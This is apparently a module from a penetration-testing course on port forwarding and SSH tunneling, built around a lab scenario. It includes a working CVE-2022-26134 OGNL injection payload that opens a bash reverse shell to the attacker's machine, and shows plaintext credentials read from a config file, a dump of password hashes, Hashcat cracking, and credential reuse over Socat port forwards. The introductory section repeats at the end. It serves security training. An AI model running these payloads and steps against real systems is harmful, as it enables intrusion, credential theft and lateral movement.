_Port redirection_ (a term we are using to describe various types of [_port forwarding_](https://en.wikipedia.org/wiki/Port_forwarding)) and [_tunneling_](https://en.wikipedia.org/wiki/Tunneling_protocol) are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means [_encapsulating_](https://en.wikipedia.org/wiki/Encapsulation_(networking)) one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The [_logical topologies_](https://en.wikipedia.org/wiki/Network_topology) we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.

## 19.2. Port Forwarding with Linux Tools

This Learning Unit covers the following Learning Objectives:

1.  Understand what port forwarding is
2.  Learn when to use port forwarding techniques
3.  Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface and pass all packets to the web server behind it.

Many home _routers_ also provide port forwarding functionality. These can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

How might we use port forwarding in an attack chain? In the next section, we'll consider a simple scenario.

## 19.2.1. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux web server running a version of [_Confluence_](https://www.atlassian.com/software/confluence) vulnerable to [_CVE-2022-26134_](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html): a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

During our enumeration, we find that this server has two _network interfaces_: one attached to the same network our Kali machine is also on (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we also find credentials and the IP address and port for a [_PostgreSQL_](https://www.postgresql.org/) database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The following diagram illustrates our current understanding of the network layout.

![Figure 1: The network layout from our perspective so far](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/9f1e3efdc5c0256e854e387e50f5a621-PRAT2_1_0_ConfluenceAndDatabaseNetworkSetup.png)

Figure 1: The network layout from our perspective so far

One of the first things to notice about this diagram is that there are two named networks: the [_Wide Area Network_](https://en.wikipedia.org/wiki/Wide_area_network) (WAN) on the left and the [_Demilitarized Zone_](https://en.wikipedia.org/wiki/DMZ_(computing)) (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the Confluence server CONFLUENCE01 straddles both.

A WAN is a network that is large and expansive. Some people refer to the public internet as the largest WAN in the world, and some larger organizations will refer to their large internal network as a WAN, or internal WAN. In this case, since we're simulating an attack from an external network, the WAN represents a large corporate internal network, or the internet itself.

In this module’s exercises, our Kali machine will be positioned in the WAN We can route directly from our Kali machine only to hosts also on the WAN.

A DMZ is a network containing devices that may be more exposed to a wider, less trusted network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and internal hosts. In this way, it serves a similar function to a real-world [_Demilitarized zone_](https://en.wikipedia.org/wiki/Demilitarized_zone). In this scenario, the DMZ is the buffer network segment between the WAN and whatever other internal networks we may find.

CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open socket" attached to the icon.

PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01 also has an "open socket" attached to it, illustrating that there's something listening on TCP port 5432 (this is likely a PostgreSQL server, since the default port is 5432).

Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.

With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL port on PGDATABASE01 from our Kali machine.

Before getting into more detail, let's set up our lab environment to recreate the scenario we've described so far.

At the end of the _Port Forwarding with Socat_ section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.

## 19.2.2. Setting Up the Lab Environment

To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we'll find a blog post from [_Rapid7_](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that includes a [_cURL_](https://curl.se/) command containing a [_proof-of-concept_](https://en.wikipedia.org/wiki/Proof_of_concept) payload that claims to exploit the vulnerability and return a reverse shell.

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 1 - The example payload from the Rapid7 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (**\-v**) **curl** request is being made to **http://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server. After this, the URL [_path_](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax) looks more interesting. We observe that a lot of the characters in it are [_URL encoded_](https://en.wikipedia.org/wiki/Percent-encoding), so we need to _URL decode_ them to get a clearer sense of what the payload actually does.

You can quickly URL decode strings by selecting _Decode As..._ > _URL_ in the _Decoder_ tab in [_Burp_](https://portswigger.net/burp), or using an online tool such as [_CyberChef_](https://gchq.github.io/CyberChef/) If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that's already public, so we can use online tools if necessary.

After URL decoding the path, the function of the payload is clearer.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

> Listing 2 - The example payload URL-decoded.

The URL path is an _OGNL injection_ payload. OGNL is [_Object-Graph Notation Language_](https://en.wikipedia.org/wiki/OGNL), an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's [_ProcessBuilder_](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html) class to spawn a _Bash_ interactive reverse shell (_bash -i_).

This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although it's not always the case, for _this_ exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.

Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-concept payload as our base. We can change the Confluence server IP to **192.168.50.63**, and the Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine (**/dev/tcp/192.168.118.4/4444**). We'll also remove the **curl** verbosity flag. This leaves us with the following modified payload:

```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 3 - The modified payload.

Now that our payload is customized for our use, we can start a [_Netcat_](https://en.wikipedia.org/wiki/Netcat) listener on our Kali machine on TCP port 4444.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

> Listing 4 - Starting Netcat listener on port 4444 on our Kali machine.

With our listener running, we'll open another shell on our Kali machine, then run the **curl** command we just constructed.

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

kali@kali:~$ 
```

> Listing 5 - Executing the modified reverse shell payload.

The command itself doesn't return anything, but the reverse shell is caught by our listener.

```
...
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> Listing 6 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.

The **id** command confirms that this shell is running with the privileges of the _confluence_ user. This user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01 to our Kali machine.

We can now start some light enumeration of CONFLUENCE01 using our new shell. We'll check the network interfaces using **ip addr**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

> Listing 7 - Enumerating network interfaces on CONFLUENCE01.

The output shows us that CONFLUENCE01 has two network interfaces: _ens192_ and _ens224_. _ens192_ has the IP address 192.168.50.63, and _ens224_ has the IP address 10.4.50.63. We can then check the routes using **ip route**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

> Listing 8 - Enumerating routes on CONFLUENCE01.

The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the _ens192_ interface, and hosts in the 10.4.50.0/24 subnet through the _ens224_ interface.

Continuing our enumeration, we'll find the Confluence configuration file at **/var/atlassian/application-data/confluence/confluence.cfg.xml**. While reading the contents using **cat**, we discover some plaintext database credentials located within.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

> Listing 9 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.

We'll find the IP address of the database server, as well as the plain text username and password used to connect to it. We can use these credentials to authenticate to the database and continue our enumeration.

We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged _confluence_ user, we are also unable to easily install software.

We _do_ have the PostgreSQL client _psql_ installed on our Kali machine, but we can't connect directly to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.

In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01, meaning that there is nothing stopping us from binding ports on the WAN interface of CONFLUENCE01 and connecting to them from our Kali machine.

This is exactly the type of situation in which port forwarding can be useful. We can create a port forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will use [_Socat_](http://www.dest-unreach.org/socat/doc/socat.html) to achieve this.

## 19.2.3. Port Forwarding with Socat

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

![Figure 2: The way we expect our port forward to work](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0821666b2826564e07661eba0550c37a-PRAT2_1_1_PortForwardPlan.png)

Figure 2: The way we expect our port forward to work

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command.

In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.

We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (**\-ddd**) Socat process. It will listen on TCP port 2345 (**TCP-LISTEN:2345**), fork into a new subprocess when it receives a connection (**fork**) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).

We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

> Listing 10 - Running the Socat port forward command.

The network is now set up like the following diagram:

![Figure 3: Socat in place as our port forwarder](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

Figure 3: Socat in place as our port forwarder

With the Socat process running, we can run **psql** on our Kali machine, specifying that we want to connect to CONFLUENCE01 (**\-h 192.168.50.63**) on port 2345 (**\-p 2345**) with the _postgres_ user account (**\-U postgres**). When prompted, we will enter the password, and once connected, we can run the **\\l** command to list the available databases.

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

> Listing 11 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward.

Success! We've connected to the PostgreSQL database through our port forward. We'll also find that we have access to the _confluence_ database.

Using our new database access, we can continue our enumeration. In the confluence database, let's query the _cwd\_user_ table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the **\\c confluence** command, then run **select \* from cwd\_user;** to review everything in that table.

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

> Listing 12 - The contents of the cwd\_user table in the confluence database.

We obtain multiple rows of user data. Each row contains data for a single Confluence user, including their password hash. We will use [_Hashcat_](https://hashcat.net/hashcat/) to try to crack these.

The [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_, so we can pass that to the **\-m** mode flag. After copying the hashes into a file called **hashes.txt**, we'll pass this as the first positional argument. We can then pass the **fastrack.txt** password list that's built into Kali as the final positional argument.

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

> Listing 13 - Hashcat having cracked the database\_admin, hr\_admin and rdp\_admin account hashes.

It appears that the password policy for this Confluence instance isn't very strong. After only a few minutes of cracking, Hashcat returns passwords for the _database\_admin_, _hr\_admin_ and _rdp\_admin_ users.

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 

```

> Listing 14 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.

With our new Socat port forward set up, our network setup will be configured much like the following diagram:

![Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/ae6bb27852f848e8c26cbb2eb12443fb-PRAT2_1_4_PortForwardSocatSSH.png)

Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01

There are only very minimal differences between this and the previous network setup. Instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the _database\_admin_ user, and the password we just cracked using Hashcat.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```

> Listing 15 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.

Success! The **database\_admin** credentials have been reused here. We have managed to connect to the SSH server on PGDATABASE01 using the credentials for _database\_admin_ we found in the PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.

In this Learning Unit, we created some simple port forwards using Socat. These allowed us to gain deeper access within a network by leveraging our existing access to a compromised host.

It should also be noted that Socat is not the only way to create port forwards on \*NIX hosts. There are several alternatives, of note:

-   [_rinetd_](https://github.com/samhocevar/rinetd) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
    
-   We can combine Netcat and a [_FIFO_](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file to create a [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5).
    
-   If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/\[interface\]/forwarding** (if it's not already configured to allow it).
    

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Port Redirection and SSH Tunneling - Port Forwarding with Socat - VM Group

#### Labs

1.  Follow the steps in this section to set up a port forward and gain access to the _confluence_ database on PGDATABASE01 using **psql** from your Kali machine. Crack the password of the _database\_admin_ user. What is the plain text password of this account?

Answer

# 19\. Port Redirection and SSH Tunneling

In this Learning Module, we will cover the following Learning Units:

-   Port Forwarding on \*NIX and Windows Machines
-   SSH Tunneling on (and between) \*NIX and Windows Machines

## 19.1. Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:

-   Understand the difference between common network layouts
-   Consider the impact of common network security devices
-   Understand when to use port redirection and tunneling techniques

Most network environments are not -and should not be- [_flat_](https://en.wikipedia.org/wiki/Flat_network), In a flat network, all devices are able to communicate freely with each other. There is little (or no) attempt to limit the access that each device has to other devices on the same network, regardless of whether devices need to communicate during normal operations.

Flat network topology is generally considered poor security practice. Once an attacker has access to a single host, they can start communicating with every other host. From there, it will be much easier to spread through the network and start compromising other hosts.

A more securely designed network type is [_segmented_](https://en.wikipedia.org/wiki/Network_segmentation).This type of network will be broken into smaller networks, each of which is called a [_subnet_](https://en.wikipedia.org/wiki/Subnetwork). Each subnet will contain a group of devices that have a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers, because compromising a single host no longer gives them free access to every other device on the network.

As part of the network segmentation process, most network administrators will also implement controls that limit the flow of traffic into, out from, and across their networks. To enforce this, they will deploy various technologies throughout the network.

One of the most common technologies used for this is [_Firewalls_](https://en.wikipedia.org/wiki/Firewall_(computing)). Firewalls can be implemented at the endpoint software level. For example, the _Linux kernel_ has firewall capabilities that can be configured with the [_iptables_](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows offers the built-in [_Windows Defender Firewall_](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security). Firewalls may also be implemented as features within a piece of physical network infrastructure. Administrators may even place a standalone _hardware firewall_ in the network, filtering all traffic.

Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block some hosts or subnets from accessing the wider _internet_.

Most firewalls tend to allow or block traffic in line with a set of rules based on _IP addresses_ and _port numbers_, so their functionality is limited. However, sometimes more fine-grained control is required. [_Deep Packet Inspection_](https://en.wikipedia.org/wiki/Deep_packet_inspection) monitors the contents of incoming and outgoing traffic and terminates it based on a set of rules.

Boundaries that are put in place by network administrators are designed to prevent the _arbitrary movement of data into, out of, and across the network_. But, as an attacker, these are exactly the boundaries we need to traverse. We'll need to develop strategies that can help us work around network restrictions as we find them.

_Port redirection_ (a term we are using to describe various types of [_port forwarding_](https://en.wikipedia.org/wiki/Port_forwarding)) and [_tunneling_](https://en.wikipedia.org/wiki/Tunneling_protocol) are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means [_encapsulating_](https://en.wikipedia.org/wiki/Encapsulation_(networking)) one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

